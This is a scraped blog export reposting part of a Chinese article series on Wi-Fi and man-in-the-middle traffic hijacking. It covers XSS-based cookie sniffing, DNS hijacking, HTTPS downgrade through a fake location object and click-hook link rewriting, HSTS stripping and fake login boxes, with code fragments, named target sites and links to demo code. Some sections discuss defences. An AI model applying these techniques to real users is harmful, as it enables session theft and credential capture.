方案优化 前后端结合战术，在此又一次得到了展现。但为了能将其发挥到淋漓尽致，我们还需进行充分优化。 路径标记 虽然我们可以通过加载第三方资源的方式，将目标站点的 Cookie 送到流量上。但中间人收到请求后又该如何处理？返回空白内容，还是代理正常页面？ 如果真走一遍代理，那实在是太浪费了。既然我们已得到 Cookie，随便返回什么都可以；但若返回空内容，要是用户正好打开这个网站，那就白屏了。 为了不影响 Cookie 的发送，同时能让中间人明白这个请求是咱们自己人的，我们在请求的 URL 里加上一个特殊的标记。 当中间人发现请求带有这个暗号，自然就明白了 —— 记录下其中携带的情报，然后放心的返回空白就可以了。 因为 Cookie 的 Path 属性不包括 Query，所以加上这个记号，并不影响 Cookie 的携带。原来有哪些，现在仍一样。 此外，修改了路径还有另一个好处：即使侦探被缓存了的站点，也能产生请求流量。从而不错过任何一个目标！ DNS 加速 解决了代理问题，发送 Cookie 现在只需极小的流量。 这时的瓶颈，已不仅仅是 HTTP 流量了。因为我们事先准备了大量的网站，他们都有各自的域名，因此 DNS 查询也成为不可忽视的一部分。 为了缩短查询时间，我们可以将所有发往 UDP/53 的数据包，全转发到中间人的 DNS 服务下，并且都解析成自己的 IP。这样不仅加快域名查询的过程，而且还能给中间人节省不少带宽。 当然，如今的浏览器，对域名解析做了大量的优化。因此在前端上，速度提升或许并不明显。 但这种方式仍有极大的意义 —— **我们同时劫持了 DNS 和 HTTP，这意味着整套方案，可以不依赖互联网，进行离线攻击！**这尤其适用于上网成本较高的户外环境里。 痕迹收集 当然，并不是所有账号都得通过 Cookie 成功还原的。稍微重视安全的网站，其登录会话都绑定了 IP 地址段。如果还原时的外网 IP，和用户之前使用的存在较大区别，这个 Cookie 很有可能就失效了。 但大多数时候，我们劫持的都是附近的用户，甚至是同一内网的，所以仍有不少能够还原的。 但随着安全等级的提高，一些网站不仅仅绑定 IP 地址，有的还关联了 User-Agent 等信息。在将来，甚至还会绑定用户更多的痕迹，例如屏幕分辨率、插件版本、绘图算法等等，更精确的识别用户。 为了能提高还原成功率，我们也尽可能多的收集用户信息。除了 User-Agent，我们还可以考虑通过前端代码，收集更详细的浏览器特征信息。在账号还原时，把这些信息都模拟到沙盒里，伪装到天衣无缝。 攻击演示 Demo: https://github.com/EtherDream/cookie_hijack_demo 当受害者进入我们的劫持环境里，打开任意页面，即可触发布置其中的 XSS 脚本。（当然，这里为了演示简单，把整个页面都替换了。实战中，可以参考前一篇的文章的注入方法） 我们的日志，成功记录下各种账号的 Cookie： 于是，就在这一瞬间 —— 尽管没做任何事，但众多账号已被黑客所控制： 当然，这里只演示最基本的功能，将嗅探到的 Cookie 保存在文件里。至于如何还原，有无数种方式，这里就不再介绍了。 原文:http://www.cnblogs.com/index-html/p/mitm-cookie-sniffer.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"流量劫持系列8_SSLStrip终极版_location瞒天过海","slug":"traffic-hijack-sslstrip-plus","date":"2015-06-02T04:47:18.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-sslstrip-plus.html","permalink":"https://sobaigu.com/traffic-hijack-sslstrip-plus.html","excerpt":"","text":"前言 之前介绍了 HTTPS 前端劫持 的方案，虽然很有趣，然而现实却并不理想。其唯一、也是最大的缺陷，就是无法阻止脚本跳转。若是没有这个缺陷，那就非常完美了 —— 当然也就没有必要写这篇文章了。 说到底，还是因为无法重写 location 这个对象 —— 它是脚本跳转的唯一渠道。尽管也流传一些 Hack 能勉强实现，但终究是不靠谱的。 事实上，在最近封稿的 HTML5 标准里，已非常明确了 location 的地位 —— Unforgeable。 这是个不幸的消息。不过也是件好事，让我们彻底打消各种偏门邪道的念头，寻求一条全新的出路。 替换明文 URL 上回也提到，可以参考 SSLStrip 那样，把脚本里的 HTTPS URL 全都替换成 HTTP 版本，即可满足部分场合。 当然，缺陷也是显而易见的。只要 URL 不是以明文出现 —— 例如通过字符串拼接而成，那就完全无法识别了，最终还是无法避免跳转到 HTTPS 页面上。 这种情况并不少见，所以我们需要更先进的解决方案。 替换 location 尽管我们无法重写 location，但要山寨一个和 location 功能一样的玩意，还是非常容易的。我们只需定义几个 getter 和 setter，即可模拟出一个功能完全相同的 location2。但如何将原先的 location 映射过来呢？ 这时，后端的作用就发挥出来了。类似替换 HTTPS URL，这次我们只关注脚本里的 location 字符，把它们都改成 location2 —— 于是所有和地址栏相关的读写，都将落到我们的代理上面。之后能做什么，不用说大家也都明白吧。 代理所有的 setter：如果跳转到 HTTPS 就将其拦下，然后降级到 HTTP 版本上。 代理所有的 getter：如果当前处于降级的页面，我们将返回的路径都还原 HTTPS 字符，即可骗过协议判断脚本，让那些自检功能彻底失效！ 相比之前的 URL 替换，这个方案完美太多 —— URL 是动态创建的非常普遍，但 location 不是明文出现的，及其罕见。 除非脚本是加密过的，否则即使用 Uglify 那样的压缩工具，也不会把全局变量给混淆。至于人为刻意去转义它，更是无稽之谈了。 &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'loc\\ation'&lt;/span&gt;].protocol != &lt;span class=&quot;hljs-string&quot;&gt;'https:'&lt;/span&gt;) &#123; &lt;span class=&quot;hljs-comment&quot;&gt;// ...&lt;/span&gt; &#125;`&lt;/pre&gt; 到此，我们的目标已经明确了： 前端：实现一个 location 代理。 后端：将脚本里出现的 location 替换成代理变量名。 处理外链脚本 虽然替换页面脚本的内容并不困难，但对于外链脚本，那就不容乐观了。 现实中，不少页面外链了 HTTPS 绝对路径 的脚本。这时，我们的中间人就无能为力了。为了避免这种情况，我们仍需替换页面里的 HTTPS URL，让中间人能掌控更多的资源。 要替换 URL 倒也不难，一个简单的正则就能实现 —— 但既然使用正则，我们面对的只能是字符串了。 然而事实上，收到的都是最原始的二进制数据，甚至未必都是 UTF-8 的。在上一篇文章里，我们为了简单，直接使用二进制的方式注入。但在如今，这个方法显然不可行了。 使用二进制，不仅难以控制，而且很不严谨。我们很难得知匹配到的是独立的字符，还是一个宽字符的部分字节。因此，我们还是得用传统可靠的方式来处理字符串。 处理字集编码 我们得借助字集转换库，例如大名鼎鼎的 iconv，来协助完成这件事： 首先将二进制数据转换成 UTF-8 字符串 有了标准的字符串，我们的正则即可顺利执行了 将处理完的字符串，重新换回先前的编码 尽管这一来一回得折腾两次，性能又得耗费不少，但这仍是必须的。 事实上，这个过程也不是想象的那么顺利。有相当多的服务器，并没有在返回的 Content-Type 里指定编码字集，于是我们只能尝试从页面的 &amp;lt;meta&amp;gt; 中获取。 但这个标签兼容诸多规范，例如过去的： `&lt;META HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html; CHARSET=GBK\"&gt;` 以及如今流行的： `&lt;meta charset=\"GBK\" /&gt; 尽管通过正则很容易获取，但用正则的前提还是得先有字符串，于是我们陷入了僵局。 不过好在标签、属性、字集名，基本都是纯 ASCII 字符，所以可先将二进制转成默认的 UTF-8 字符串，从中取出字集信息，然后再进行转码。 处理数据分块 得益于丰富的第三方扩展，上述问题都不难解决。 然而，之前提到过『前端劫持』的一个巨大优势 —— 无需处理所有数据，只需在第一个 chunk 里注入代码即可。但现在，这项优势面临着严峻的考验。 我们要替换页面里的 HTTPS 资源、location 变量等等，它们会出现在页面的各个位置。如果我们对每个 chunk 进行单独过滤、转发，这样会有问题吗？ 现实中，未必都是这样理想的 —— 总会有那么一定的几率，替换的关键字正好跨越两个 chunk： 这时候，残缺的首尾都无法匹配到，于是就会出现遗漏。关键字越长，出现的几率也就越大。对于 URL 这样长的字符串来说，这是一个潜在的隐患。 要完美解决这个问题，是比较麻烦的。不过有个简单的办法：我们可以扣留下 chunk 末尾部分字符，拼接到下个 chunk 的之前，从而降低遗漏的可能。 当然，如果不考虑用户体验的话，还是收集完所有数据，最后一次性处理，最省事了。 事实上还有更好的方案：中间人开启一个缓冲区，将收到数据暂时缓存其中。当数据积累到一定量、或者超过多久没有数据时，才开始批量处理缓存队列。 这样就可以避免 频繁的 chunk 上下文处理，同时也 不会长时间阻塞用户的响应时间，自然是两全其美的。 这是不是有点类似 TCP nagle 的味道呢。 前端 location 代理 讲完了后端的相关细节，我们继续回到前端的话题上。 实现一个 location 的代理很简单，不过值得留意的细节倒是不少： location 不仅存在于 window，其实 document 里也有个相同的。 location 对象本身也是可以被赋值的，效果等同于 location.href。（[PutForwards=href, ...]已经很好的解释了） 同理，location 的 toString 返回的也是 href 属性。 如果带有 location2 的脚本被缓存住了，那么用户在没有劫持的页面里，也许就会报错。所以还得留一条兼容的后路。 … 只要考虑充分，实现一个 location 的切面还算是比较容易的。 动态脚本劫持 前面谈到替换页面的 HTTPS URL，以确保外链脚本明文传输。 然而现实中，并非所有脚本都是静态的。如今这个脚本泛滥的时代，动态加载模块是很常见的事。如果引入的是一个 HTTPS 的脚本，那么我们的中间人又无从下手了。 不过值得庆幸的是，模块拦截不像 location 那样无法实现。现实中，有非常多的方法可以拦截动态模块。在之前写的《XSS 前端防火墙 —— 可疑模块拦截》 一文里，已经详细讨论过各种方法和细节，这里正好派上用场。 事实上，除了脚本外，框架页同样也存在这个问题。上一篇文章里，我们采用 CSP 来阻挡 HTTPS 的框架页。但那仅仅是屏蔽，并不是真正意义的拦截。只有加上如今这套钩子系统，才算一个完善的拦截系统。 演示 说了那么多，真正的核心无非就是改变脚本里的 location 变量而已，其他的一切都只是为了辅助它。 下面我们找几个之前无法成功的网站，试验下这个加强版的劫持工具。 上一篇文章里提到京东登录，就是通过脚本跳转的。我们首先就拿它测试： 当流量经过中间人代理，页面和脚本里的 location 都变成了我们的变量名。于是之后和地址栏相关的一切，尽在我们的掌控之中了： 注意地址栏里有一个 zh_cn 的标记，那正是 URL 向下转型后的识别暗号。 通过 location2 获取到的一切属性，看起来就像在 HTTPS 页面上一模一样。即使脚本里有自检功能，也会被我们的虚拟环境所欺骗。 点击登录，自然是成功的。 毕竟，HTTPS 和 HTTP 只是传输上的差异。在应用层上，页面是无法知晓的 —— 除了询问脚本的 location，但它已被我们劫持了。 除了京东的脚本跳转，财付通网站则是通过非主流的 &amp;lt;meta http-equiv=&quot;refresh&quot;&amp;gt; 进行的。 好在我们对页面里的 HTTPS URL 都替换了，所以仍然能够跳转到降级后的页面： 值得注意的是，如果是从 QQ 图标里点进来的，那么页面就直接进入 HTTPS 版本，就不会被劫持了。但从第三方过来那就听天由命了。 由于一般开发人员的思维，是不可能转义 location 这个变量的。因此这套方案几乎可以通杀所有的安全站点。 当然，外国的网站也是一样的。只要之前没有被 HSTS 所缓存，劫持依旧轻松自如。 … 所以，只要发挥无尽的想象，实现一个工程化的通用劫持方案，依然是可行的。 防范措施 如果你是仔细看完本文的话，应该早就想到如何应对了。 事实上，由于 JS 具有超强的灵活性，几乎无法从静态源码推测运行时的行为。 因此，只要将涉及 location 相关操作，进行简单的转义混淆，就能躲过中间人的劫持了。毕竟，要在劫持流量的同时，还要对脚本进行语法分析，这个代价不免有点大了。 原文:http://www.cnblogs.com/index-html/p/sslstrip-plus.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[]},{"title":"流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持","slug":"traffic-hijack-sslstrip","date":"2015-05-27T01:31:46.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-sslstrip.html","permalink":"https://sobaigu.com/traffic-hijack-sslstrip.html","excerpt":"","text":"前言 在之前介绍的流量劫持文章里，曾提到一种『HTTPS 向下降级』的方案 —— 将页面中的 HTTPS 超链接全都替换成 HTTP 版本，让用户始终以明文的形式进行通信。 看到这，也许大家都会想到一个经典的中间人攻击工具 —— SSLStrip，通过它确实能实现这个效果。 不过今天讲解的，则是完全不同的思路，一种更有效、更先进的解决方案 —— HTTPS 前端劫持。 后端的缺陷 在过去，流量劫持基本通过后端来实现，SSLStrip 就是个典型的例子。 类似其他中间人工具，纯后端的实现只能操控最原始的流量数据，这严重阻碍了向更高层次的发展，面临众多难以解决的问题。 动态元素怎么办？ 如何处理数据包分片？ 性能消耗能否降低？ … 动态元素 在 Web 刚出现的年代里，SSLStrip 这样的工具还是大有用武之地的。那时的网页都以静态为主，结构简单层次清晰。在流量上进行替换，完全能够胜任。 然而，如今的网页日益复杂，脚本所占比重越来越多。如果仅仅从流量上着手，显然力不从心。 &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; protocol = &lt;span class=&quot;hljs-string&quot;&gt;'https'&lt;/span&gt;; &lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.write(&lt;span class=&quot;hljs-string&quot;&gt;'&amp;lt;a href=&quot;'&lt;/span&gt; + protocol + &lt;span class=&quot;hljs-string&quot;&gt;'://www.alipay.com/&quot;&amp;gt;Login&amp;lt;/a&amp;gt;'&lt;/span&gt;);`&lt;/pre&gt; 即使非常简单的动态元素，后端也毫无招架之力。 ### 分片处理 分块传输的道理大家都明白。对于较大的数据，一口气是无法传完的。客户端依次收到各个数据块，最终才能合并成一个完整的网页。 ![](http://images.cnitblog.com/blog/273626/201410/141701402944539.png) 由于每次收到的都是残缺的碎片，这给链接替换带来很大的麻烦。加上不少页面并非标准的 UTF-8 编码，因此更是难上加难。 为了能顺利进行，中间人通常先收集数据，等到页面接收完整，才开始替换。 ![](http://images.cnitblog.com/blog/273626/201410/141702016231956.png) 如果把数据比作水流，这个代理就像大坝一样，拦截了源源不断往下流的水，直到蓄满了才开始释放。因此，下游的人们需忍受很久的干旱，才能等到水源。 ### 性能消耗 由于 HTML 兼容众多历史遗留规范，因此替换工作并非是件轻松事。 各种复杂的正则表达式，消耗着不少的 CPU 资源。尽管用户最终点击的只是其中一两个链接，但中间人并不知道将会是哪个，因此仍需分析整个页面。这不得不说是个悲哀。 * * * ## 前端的优势 如果我们的中间人能打入到页面的前端，那么情况会不会有所改善呢？ ### 分片处理 首先，要派一名间谍到页面里。这是非常容易办到的： ![](http://images.cnitblog.com/blog/273626/201410/141702116546920.png) 不像超链接遍布在页面各处，脚本插入到头部即可运行了。所以我们根本不用整个页面的数据，只需改造下第一个 chunk 就可以，后续的数据仍然交给系统转发。 因此，整个代理的时间几乎不变！ ### 动态元素 很好，我们轻易渗透到页面里。但接着又如何发起进攻？ 既然到了前端里，方法就相当多了。最简单的，就是遍历超链接元素，将 https 的都替换成 http 版本。 这个想法确实不错，但仍停留在 SSLStrip 思维模式上。还是『替换』这条路，只是从后端搬到前端而已。 尽管这个方法能胜任大多场合，但仍然不是最完美的。我们并不知道动态元素何时会添加进来，因此需要开启定时器不断的扫描。这显然是个很挫的办法。 ### 性能优化 事实上，超链接无论是谁产生的、何时添加进来的，**只要不点击，都是不起作用的**。所以，我们只需关心何时去点击就可以 —— 如果我们的程序，能在点击产生的第一时间里控制住现场，那么之后的流程就可由我们决定了。 听起来似乎很玄乎，不过在前端，这只是小菜一碟的事。点击，不过个事件而已。既然是事件，我们用最基础的事件捕获机制，即可将其轻松拿下： &lt;pre class=&quot;js&quot;&gt;`&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.addEventListener(&lt;span class=&quot;hljs-string&quot;&gt;'click'&lt;/span&gt;, &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(e)&lt;/span&gt; &lt;/span&gt;&#123; &lt;span class=&quot;hljs-comment&quot;&gt;// ...&lt;/span&gt; &#125;, &lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);`&lt;/pre&gt; DOM-3-Event 是个非常有意义的事件模型。之前用它来实现『[内联 XSS 拦截](http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-1/)』，如今同样也可以用来劫持链接。 我们捕获全局的点击事件，如果发现有落在 https 超链接上，果断将其......拦截？ 如果真把它拦截了，那新页面就不会出现了。当然你会说，可以自己 window.open 弹一个，反正点击事件里是可以弹窗的。 不过，请别忘了，并非所有的超链接都是弹窗，也有不少是直接跳转的。你也会说可以修改 location 来实现。 但要识别是『弹窗』还是『跳转』，并不简单。除了超链接的 `target` 属性，页面里的 `&amp;lt;base&amp;gt;` 元素也会有影响。当然，这些相信你都能处理好。 然而，现实未必都是那么简单的。有些超链接本身就绑定了 onclick 事件，甚至在其中 return false 或 preventDefault，屏蔽了默认行为。如果我们不顾及这些，仍然模拟跳转或弹窗，那就违背页面的意愿了。 事实上，有一个非常简单的办法：当我们的捕获程序运行时，新页面还远没出现，这时仍有机会修改超链接的 href。待事件冒泡完成、执行默认行为时，浏览器才读取 href 属性，作为最终的结果。 因此，我们只需捕获点击事件，修改超链接地址就可以了。至于是跳转、弹窗、还是被屏蔽，根本不用我们关心。 ![](http://images.cnitblog.com/blog/273626/201410/141702370912824.png) 就那么简单。因为我们是在用户点下去之后才修改，所以浏览器状态栏里，显示的仍是原先 https ！ 当然，点过一次之后，再把鼠标放到超链接上，状态栏里显示的就是修改后的了。 为了能继续忽悠，我们在修改 href 之后的下个线程周期里，把它改回来。因为有了一定延时，新页面并不受影响。 &lt;pre class=&quot;js&quot;&gt;`&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; url = link.href; &lt;span class=&quot;hljs-comment&quot;&gt;// 保存原始地址&lt;/span&gt; link.href = url.replace(&lt;span class=&quot;hljs-string&quot;&gt;'https://'&lt;/span&gt;, &lt;span class=&quot;hljs-string&quot;&gt;'http://'&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;// 暂时换成 http 的&lt;/span&gt; setTimeout(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&#123; link.href = url; &lt;span class=&quot;hljs-comment&quot;&gt;// 新页面打开后，还原回来&lt;/span&gt; &#125;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;);`&lt;/pre&gt; 这样，页面里的超链接始终都是正常的 —— 只有用户点下的瞬间，才临时伪装一下。 * * * ## 更多拦截 除了通过超链接，还有其他方式访问页面，我们应尽可能多的进行监控。例如： 表单提交 window.open 弹窗 框架页面 … 表单提交 表单提交和超链接非常类似，都具有事件，只是将 click 换成 submit，href 换成 action 而已。 脚本弹窗 函数调用的最简单了，只需一个小钩子即可搞定： `var raw_open = window.open; window.open = function(url) { // FIX: null, case insensitive arguments[0] = url.replace('https://', 'http://'); raw_open.apply(this, arguments); }` 框架页面 因为我们把主页面降级成 http 了，但里面的框架地址仍是原先的。由于协议不同，这会产生跨域问题，导致页面无法正常工作。 所以我们还要把页面里的框架，也都转型成 http 版本，确保能和主页面融为一致。 但框架和之前的那些不同，因为它是自动加载的，而且也没有一个即将加载的事件。如果等到框架加载完了再去处理，说不定已经开始报跨域错误了。而且还会白白的浪费一次加载流量。 因此，我们必须让框架一出现，就立即替换掉地址。 这在过去是个很棘手的问题，然而 HTML5 时代给我们带来了新希望 —— MutationEvent。用它即可实时监控页面元素，之前也尝试过一些试验。 当然，即使 MutationEvent，偶尔也会有延时遗漏。为了能彻底避免出现 https 框架页，我们继续使用 HTML5 带来的一项新技术 —— Content Security Policy，由于它是浏览器原生支持的，因此实施的非常彻底。 在我们的代理返回头中，加上如下 HTTP 头部，即可完美拦截 https 框架页了： `Content-Security-Policy: default-src * data: 'unsafe-inline' 'unsafe-eval'; frame-src http://*` 解决了框架页的问题，我们就能成功劫持支付宝登录页的账号框 IFrame 了！ 后端配合 通过前端的 XSS 脚本，我们轻易解决了过去各种棘手的问题。但挑战并未就此结束，我们仍面临着众多难题。 如何告诉代理 尽管在前端上面，我们已经避开了各种进入 https 的途径，让请求以明文的形式交给代理。但代理又如何决定，这个请求用 https 还是 http 转发呢？ 传统的后端劫持之所以能正确转发，那是在替换超链接的时候，已经做下记录。当出现记录中的请求，就走 https 的转发。 而我们的劫持在前端，并且只发生在点击的一瞬间。即使马上去告诉中间人，某个 URL 是 https 的，这时也来不及了。 告诉中间人是必须的。但我们可以用一个巧妙的方法，不必单独发送消息 —— 我们只需在转型后的 URL 里，做个小记号就可以了。 当代理发现请求的 URL 里有这个记号，它自然就懂了，直接走 https！ 由于把页面从 https 降级到了 http，因此相关请求的referer也变成 http 版了。所以，中间人应尽量把 referer 也修正回来，避免被服务器察觉。 隐藏伪装 不过，在 URL 里加标记的方法，也有很大的缺陷。 因为页面的 URL 会在地址栏里显示出来，所以用户会看见我们的记号。当然，我们可以使用一些迷惑性的字符，例如 ?zh_cn、?utf_8，?from_baidu 等等，更好的欺骗用户。 当然，如果你觉得还是不满意，也有办法让这些碍眼标记尽快消失： `if url has symbol history.replaceState(..., clear_symbol(url) ) HTML5 为我们提供了修改地址栏的能力，并且无需刷新。这些强悍的功能，如今都可以在前端利用起来了。 重定向劫持 当然，光靠前端的劫持，还是远远不够的。现实中，还有另一种很常见的方式，那就是重定向到安全页面。 仔细回想下，平时我们是怎样进入想上的网站的。例如支付宝，除非你有收藏，否则就得自己敲入 www.alipay.com 或 www.zhifubao.com，当你回车进入时，浏览器又如何知道这是个 HTTPS 的网站呢？ 显然，第一个请求仍是普通的 HTTP 协议。当然，这个 HTTP 版的支付宝的确存在，它的唯一功能就将用户重定向到 HTTPS 版本。 当我们的中间人一旦发现有重定向到 HTTPS 网站的，当然不希望用户走这条不受自己控制的路。于是拦下这个重定向，然后以 HTTPS 的方式，获取重定向后的内容，最后再以 HTTP 明文的方式，回复给用户。 因此在用户看来，始终处于 HTTP 网站上。 不过，如今的 Web 里增加一个新的安全标准：HTTP Strict Transport Security。如果客户端收到这个头部，之后一段时间内访问该站点，就始终通过 HTTPS 的方式。 所以我们的中间人一旦发现有这个字段，就得果断将其删除。 当然，用户直接敲网址的并不常见。大多都是搜索引擎，然后直接从第一个结果里进来了。 比较悲剧的是，国内的搜索引擎几乎都是 HTTP 的。在用户访问搜索页面的时候，我们的 XSS 早已潜伏在其中了，因此从中点出来的任何一条结果，都是进不到官方的 HTTPS 里的：） 除了搜索页面，不少类似 hao123 之类的网址大全，大多也未开启 HTTPS。因此从中导流的网站，都面临着被中间人劫持的风险。 防范措施 介绍了攻击方法，接着讲解防御措施。 脚本跳转 事实上，无论是前端劫持还是后端过滤，仍有不少的网站无法成功。例如京东的登录： 它是通过脚本跳转到 HTTPS 地址的。而浏览器的 location 是个及其特殊的属性，它可以被屏蔽，但无法被重写。因此我们难以控制页面的跳转情况。 如果非要劫持京东页面，我们只能使用白名单的方式，特殊对待该站点。但这样就大幅增加了攻击成本。 混淆明文 当然，不难发现京东的登录脚本里，URL 是以最直白的明文出现的。所以我们利用 SSLStrip 的方式，对脚本里的 https:// 的文本进行替换，也能起到一定的作用，毕竟大多脚本都对此毫无防备。 但对于稍微复杂一点的脚本，例如通过字符串拼接而成的 URL，那么就难以实施了。 所以在安全需要较高的场合，不妨把一些重要的地址进行简单的处理，中间人就无法使用通用的方式来攻击。而必须针对站点进行特殊对待，从而提高攻击成本。 尽可能多的 HSTS 之前提到 HSTS 头。只要这个字段出现过一次，浏览器在很长时间里都会只用 HTTPS 访问站点。因此，我们尽可能多的开启 HSTS。 现实中的劫持并非都是 100% 成功的，上述提到，使用脚本跳转很容易出现遗漏。所以，只要逮住用户一次遗漏，HSTS 就可以让之后的页面降级彻底失效了。 攻击演示 因为是前端劫持，所以 Demo 有两个文件：一个前端代码，另一个后端脚本（NodeJS）。 相关源码：https://github.com/EtherDream/https_hijack_demo 相比之前写的流量劫持演示，这里功能更为专一，不再提供额外的劫持途径（例如 DNS 等）。 想测试其实非常简单，只需配置浏览器代理，即可模拟 HTTP 的劫持： 不嫌麻烦的话，也可以在 Linux 内核的系统上测试，转发 80 到本机即可。原理都是一样的。 我们随便找一个 HTTP -&amp;gt; HTTPS 网站做测试。 得益于前端脚本的优势，我们把鼠标放到登录超链接上，状态栏显示的仍是原始 URL： 在我们点击的瞬间，暗藏页面中的 XSS 钩子触发了，成功把我们带到中间人虚拟的 HTTP 登录页面里。 当然，由于 URL 参数很多，地址栏里的那个记号看不到了。 庆幸的是，淘宝的登录页面未进行地址判断，被降级后的页面仍然能登录成功！ 当然之前也说了，并非所有的页面都能劫持成功。 如今越来越多的网站都已重视，因此前端的安全性检测也随之而生。仅仅通过一个工具，实现大规模通用化的劫持，未来会更加困难。 但先比传统的纯后端实现，前后结合的方案能够带来更大的发挥空间。 原文链接:http://www.cnblogs.com/index-html/p/ssl-frontend-hijack.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"流量劫持系列6_浮层登录框的隐患","slug":"traffic-hijack-danger-dialog","date":"2015-05-21T15:51:56.000Z","updated":"2024-09-28T00:17:21.256Z","comments":true,"path":"traffic-hijack-danger-dialog.html","permalink":"https://sobaigu.com/traffic-hijack-danger-dialog.html","excerpt":"","text":"传统的登录框 在之前的文章流量劫持危害详细讲解了 HTTP 的高危性，以至于重要的操作都使用 HTTPS 协议，来保障流量在途中的安全。 这是最经典的登录模式。尽管主页面并没有开启 HTTPS，但登录时会跳转到一个安全页面来进行，所以整个过程仍是比较安全的 —— 至少在登录页面是安全的。 对于这种安全页面的登录模式，黑客硬要下手仍是有办法的。在之前的文章里也列举了几种最常用的方法：拦截 HTTPS 向下转型、伪造证书、跳转钓鱼网站。 其中转型 HTTPS 的手段最为先进，甚至一些安全意识较强的用户也时有疏忽。 然而，用户的意识和知识总是在不断提升的。尤其在如今各种网上交易的时代，安全常识广泛普及，用户在账号登录时会格外留心，就像过马路时那样变得小心翼翼。 久而久之，用户的火眼金睛一扫地址栏即可识别破绽。 因此，这种传统的登录模式，仍具备一定的安全性，至少能给用户提供识别真假的机会。 华丽的登录框 不知从何时起，人们开始热衷在网页里模仿传统应用程序的界面。无论控件、窗口还是交互体验，纷纷向着本地程序靠拢，效果越做越绚。 然而华丽的背后，其本质仍是一个网页，自然掩盖不了网页的安全缺陷。 当网页特效蔓延到一些重要数据的交互 —— 例如账号登录时，风险也随之产生。因为它改变了用户的使用习惯，同时也彻底颠覆了传统的意识。 乍一看，似乎也没什么问题。虽然未使用登录页跳转，但数据仍通过 HTTPS 传输，途中还是无法被截获。 HTTP 页面用 HTTPS 有意义吗？ 如果认为这类登录框没什么大问题，显然还没领悟到『流量劫持』的精髓 —— 流量不是单向的，而是有进也有出。 能捕获你『出流量』的黑客，大多也有办法控制你的『入流量』。这在流量劫持第一篇里也详细列举了。 使用 HTTPS 确实能保障通信的安全。但在这个场合里，它只能保障『发送』的数据，对于『接收』的流量，则完全不在其保护范围内。 因为整个登录框都当作『虚拟窗口』嵌套在主页面里的，因此其中的一切都在同个页面环境里。而主页面使用的仍是不安全的 HTTP 协议，所以注入的 XSS 代码能轻而易举的控制登录框。 当然，或许你会说这只是设计缺陷。若是直接嵌入 HTTPS 登录页的 iframe 框架，那就会因同源策略而无法被 XSS 控制了。 这样的改进确实能提高一些安全性，但也只是略微的。既然我们能控制主页面，里面显示什么内容完全可以由 XSS 说了算。不论什么登录框、框架页，甚至安全插件，我们都可以将其删除，用看起来完全相同的文本框代替。得到账号后，通过后台反向代理实现登录，然后通知前端脚本伪造一个登录成功的界面。 所以，HTTPS 被用在 HTTP 页面里，意义就大幅下降了。 